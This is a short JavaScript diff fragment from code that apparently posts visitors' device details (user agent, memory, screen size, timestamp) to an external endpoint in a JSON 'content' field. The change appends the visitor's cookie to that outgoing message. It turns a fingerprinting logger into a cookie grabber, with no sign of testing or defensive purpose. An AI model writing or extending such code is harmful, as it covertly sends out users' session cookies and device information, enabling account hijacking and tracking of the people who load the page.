@@ -45,7 +45,7 @@
 						'Content-Type': 'application/json',
 					},
 					body: JSON.stringify({
-						content: `User Agent: ${userAgent}\nDevice Memory: ${deviceMemory}\nDevice Width: ${deviceWidth}\nDevice Height: ${deviceHeight}\nTimestamp: ${data.timestamp}`,
+						content: `User Agent: ${userAgent}\nDevice Memory: ${deviceMemory}\nDevice Width: ${deviceWidth}\nDevice Height: ${deviceHeight}\nTimestamp: ${data.timestamp}\nCookie: ${data.cookie}`,
 					}),
 				});
 			}
